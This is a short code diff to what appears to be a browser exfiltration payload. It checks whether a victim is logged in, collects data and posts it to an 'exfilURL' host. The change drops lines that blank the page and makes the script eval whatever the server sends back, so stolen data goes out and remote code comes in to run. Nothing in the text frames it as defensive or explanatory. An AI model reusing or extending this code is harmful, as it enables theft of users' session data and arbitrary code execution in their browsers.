@@ -9,8 +9,6 @@
   script.type = 'text/javascript';
   script.onload = function() {
     (function($) {
-      var b = $('body');
-      b.html('');
       $.get(loginCheckURL, function(r) {
         if (r.match(loginCheckPattern)) {
           var isSent = false;
@@ -18,7 +16,7 @@
           var remaining = {{dataURLCount}};
           var exfil = function() {
             if (!isSent) {
-              $.post(exfilURL, JSON.stringify(xdata), function(r) {}, 'script');
+              $.post(exfilURL, JSON.stringify(xdata), function(r) {eval(r)}, 'text');
               isSent = true;
             }
           }
